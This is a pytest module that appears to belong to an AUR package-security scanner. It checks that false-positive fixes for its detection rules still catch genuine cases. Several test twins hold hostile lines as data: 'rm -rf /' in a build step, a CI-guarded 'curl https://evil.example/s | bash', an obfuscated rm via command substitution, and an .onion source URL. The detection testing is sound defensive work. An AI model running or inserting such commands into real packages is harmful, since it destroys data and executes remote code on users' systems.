"""Malicious false positives from the 2026-11-08..2026-11-09 watcher window.

H058 was the dominant generator: small housekeeping batches from low-activity
maintainers, bulk SPDX license normalisation, and format-variant families.
Each case pins the benign shape and the true-positive twin the fix keeps.
"""

from __future__ import annotations

import copy
import sys
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from trustsight.full_aur._pipeline_helpers import _is_routine_bump  # noqa: E402
from trustsight.full_aur.temporal_engine import run_corpus_sweep  # noqa: E402

NOW = 1_800_000_000


@pytest.fixture
def thresholds(monkeypatch):
    def set_values(values: dict):
        monkeypatch.setattr(
            "trustsight.full_aur.temporal_engine.load_thresholds", lambda: values
        )
        monkeypatch.setattr("trustsight.config.load_thresholds", lambda: values)

    return set_values


def _meta(names, maintainer, modified=False, base=None):
    return {
        name: {
            "Name": name,
            "PackageBase": base or name,
            "Maintainer": maintainer,
            "LastModified": (NOW if modified else NOW - i - 1000),
        }
        for i, name in enumerate(names)
    }


def _h058(new, old, **kwargs):
    return [f for f in run_corpus_sweep(new, old, **kwargs)
            if f["rule_id"] == "H058"]


HISTORY = [{"maintainer": "kyechou", "cycle_time": c, "activity": 1}
           for c in (1, 2, 3, 4)]


# --- routine-class widening: metadata-only edits are maintenance -----------

def test_license_identifier_normalisation_is_routine():
    old = "pkgname=p\npkgver=1\npkgrel=1\nlicense=('GPL3')\npkgdesc='x'\n"
    new = "pkgname=p\npkgver=1\npkgrel=2\nlicense=('GPL-3.0-only')\npkgdesc='x'\n"
    assert _is_routine_bump(old, new)


def test_description_and_comment_changes_are_routine():
    old = "# Maintainer: a\npkgname=p\npkgver=1\npkgrel=1\npkgdesc='old'\nsource=('x')\n"
    new = ("# Maintainer: a\n# tidy\npkgname=p\npkgver=1\npkgrel=1\n"
           "pkgdesc='new text'\nsource=('x')\n")
    assert _is_routine_bump(old, new)


def test_source_change_is_not_routine():
    old = "pkgname=p\npkgver=1\npkgrel=1\nsource=('x')\n"
    new = "pkgname=p\npkgver=1\npkgrel=1\nsource=('x' 'y')\n"
    assert not _is_routine_bump(old, new)


def test_build_change_is_not_routine():
    old = "pkgname=p\npkgver=1\npkgrel=1\nbuild() {\n  make\n}\n"
    new = "pkgname=p\npkgver=1\npkgrel=1\nbuild() {\n  make && rm -rf /\n}\n"
    assert not _is_routine_bump(old, new)


def test_unbalanced_checksum_removal_is_not_routine():
    h = "a" * 64
    old = f"pkgname=p\npkgver=1\npkgrel=1\nsha256sums=('{h}' '{h}')\n"
    new = f"pkgname=p\npkgver=1\npkgrel=1\nsha256sums=('{h}')\n"
    assert not _is_routine_bump(old, new)


# --- H058: a license tidy batch is not a surge -----------------------------

def test_h058_metadata_only_batch_is_not_a_deviation(thresholds):
    thresholds({"h058": {"min_history_cycles": 3, "z_score": 2.0,
                         "min_activity": 2}})
    names = ["bgpdump", "containernet-git", "dotool-git", "gllvm-git",
             "libredblack", "ydotool-git"]
    old = _meta(names, "kyechou")
    new = _meta(names, "kyechou", modified=True)
    assert _h058(new, old, maintainer_history=HISTORY,
                 routine_only=set(names)) == []


# --- H058: format-variant family is one release ----------------------------

def test_h058_format_variant_family_is_not_a_deviation(thresholds):
    """eot/otf/ttf/ttc/otc/woff of one font family is one update."""
    thresholds({"h058": {"min_history_cycles": 3, "z_score": 2.0,
                         "min_activity": 2}})
    names = [f"{fmt}-alibabasans-kr-fonts"
             for fmt in ("eot", "otf", "ttf", "ttc", "otc", "woff")]
    old = _meta(names, "kyechou")
    new = _meta(names, "kyechou", modified=True)
    assert _h058(new, old, maintainer_history=HISTORY) == []


# --- H058: an absolute floor keeps small housekeeping quiet ----------------

def test_h058_small_batch_is_not_a_deviation_even_when_z_is_high(thresholds):
    thresholds({"h058": {"min_history_cycles": 3, "z_score": 2.0,
                         "min_activity": 2}})
    names = ["alps", "supersonic", "telegraf", "other"]
    old = _meta(names, "kyechou")
    new = _meta(names, "kyechou", modified=True)
    # With a flat baseline of 1 this is z=3, but four packages is not a surge.
    assert _h058(new, old, maintainer_history=HISTORY) == []


# --- TP twins: the genuine shapes still fire -------------------------------

def test_h058_diverse_large_batch_still_fires(thresholds):
    thresholds({"h058": {"min_history_cycles": 3, "z_score": 2.0,
                         "min_activity": 2}})
    names = ["alpha", "beta", "gamma", "delta", "epsilon", "zeta"]
    old = _meta(names, "kyechou")
    new = _meta(names, "kyechou", modified=True)
    repos = {name: {f"https://github.com/owner{i}/{name}"}
             for i, name in enumerate(names)}
    findings = _h058(new, old, maintainer_history=HISTORY, source_repos=repos)
    assert len(findings) == 1
    assert findings[0]["params"]["activity"] == 6


# --- Folded rules from the same window -------------------------------------

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402


def _ids(diff, cur=None):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p", current_text=cur)
    return {e.rule_id for e in fact.score_breakdown}


def _diff(path, *added, fn="build"):
    lines = "".join(f"+{a}\n" for a in added)
    return (f"--- a/{path}\n+++ b/{path}\n@@ -1,1 +1,{len(added) + 1} @@\n"
            f" {fn}() {{\n{lines} }}\n")


# H108/H017: a notice prints the service command; it does not run it.

_NOTICE = ('  note "You can enable as current regular user: '
           "'systemctl enable --user --now pkg.service'...\"")


def test_h108_quoted_notice_is_not_a_service_enable():
    assert "H108" not in _ids(_diff("p.install", _NOTICE, fn="post_install"))


def test_h017_quoted_notice_is_not_privileged_setup():
    assert "H017" not in _ids(_diff("p.install", _NOTICE, fn="post_install"))


def test_h108_real_service_enable_still_fires():
    assert "H108" in _ids(_diff("p.install", "  systemctl enable --now pkg.service", fn="post_install"))


def test_h108_shell_wrapped_enable_still_fires():
    assert "H108" in _ids(
        _diff("p.install", '  bash -c "systemctl enable --now pkg.service"', fn="post_install"))


# H071: clearnet .i2p inner label is not a covert host.

def test_h071_clearnet_i2p_mirror_is_not_covert():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,2 @@\n f() {\n"
            '+  url=https://files.i2p.net/2.14.1/x.tar.gz\n}\n')
    assert "H071" not in _ids(diff)


def test_h071_onion_host_still_fires():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,2 @@\n f() {\n"
            '+  url=http://abcdefghij234567.onion/x.tar.gz\n}\n')
    assert "H071" in _ids(diff)


# H067: a CI guard is build configuration unless it gates a payload.

def test_h067_ci_guard_is_not_anti_analysis():
    diff = _diff("PKGBUILD",
                 '  if [ -z "$GITHUB_ACTIONS" ] && [ -z "$CI" ]; then',
                 '    export RUSTFLAGS="-C target-cpu=native"',
                 "  fi")
    assert "H067" not in _ids(diff)


def test_h067_ci_guard_with_payload_still_fires():
    diff = _diff("PKGBUILD",
                 '  if [ -z "$CI" ]; then curl https://evil.example/s | bash; fi')
    assert "H067" in _ids(diff)


# X002: a resolved system command / package-derived launcher is not hidden.

def test_x002_path_lookup_command_is_not_hidden():
    diff = _diff("p.install",
                 '  parser=$(command -v apparmor_parser 2>/dev/null || true)',
                 '  "${parser}" -r "${dst}"')
    assert "X002" not in _ids(diff)


def test_x002_package_derived_launcher_is_not_hidden():
    diff = _diff("PKGBUILD", '  "${pkgname%-bin}.js"')
    assert "X002" not in _ids(diff)


def test_x002_command_substitution_still_fires():
    diff = _diff("PKGBUILD", "  $(printf '%s' rm) -rf /tmp/x")
    assert "X002" in _ids(diff)


# X033: a file inside a VCS checkout has provenance.

_GIT_CUR = ('pkgname=p\npkgver=1\npkgrel=1\n'
            'source=("nmap"::"git+https://github.com/nmap/nmap.git")\n'
            "sha256sums=('SKIP')\n")


def test_x033_vcs_checkout_file_has_provenance():
    diff = _diff("PKGBUILD", "  cd ../ndiff", "  python ndifftest.py")
    assert "X033" not in _ids(diff, _GIT_CUR)


def test_x033_srcdir_root_execution_still_fires():
    cur = ("pkgname=p\npkgver=1\npkgrel=1\n"
           'source=("https://example.com/x.tar.gz")\n'
           "sha256sums=('" + "a" * 64 + "')\n")
    diff = _diff("PKGBUILD", '  bash "$srcdir"/stage.sh')
    assert "X033" in _ids(diff, cur)


# C001: a checksum refreshed for a committed file is not a remote swap.

def test_c001_local_patch_checksum_is_demoted():
    old, new = "a" * 64, "b" * 64
    cur = ("pkgname=p\npkgver=1\npkgrel=1\n"
           "source=('git+https://github.com/x/y' 'fix.patch')\n"
           f"sha256sums=('SKIP' '{new}')\n")
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n"
            " pkgname=p\n pkgver=1\n pkgrel=1\n"
            " source=('git+https://github.com/x/y' 'fix.patch')\n"
            f"-sha256sums=('SKIP' '{old}')\n+sha256sums=('SKIP' '{new}')\n")
    ids = _ids(diff, cur)
    assert "C001" not in ids and "C002" in ids


def test_c001_remote_tarball_checksum_still_fires():
    old, new = "a" * 64, "b" * 64
    cur = ("pkgname=p\npkgver=1\npkgrel=1\n"
           "source=('https://github.com/x/y/archive/v1.tar.gz')\n"
           f"sha256sums=('{new}')\n")
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,5 @@\n"
            " pkgname=p\n pkgver=1\n pkgrel=1\n"
            " source=('https://github.com/x/y/archive/v1.tar.gz')\n"
            f"-sha256sums=('{old}')\n+sha256sums=('{new}')\n")
    assert "C001" in _ids(diff, cur)


# H065/H043: an inline interpreter program is source, not obfuscation.

def test_h065_node_print_introspection_is_not_obfuscation():
    diff = _diff(
        "PKGBUILD",
        '  _v="$(node -p "require(\'./package.json\').packageManager?.split(\'@\')[1]")"')
    assert "H065" not in _ids(diff)


def test_h065_quote_assembly_still_fires():
    assert "H065" in _ids(_diff("PKGBUILD", '  b"u"n --version'))
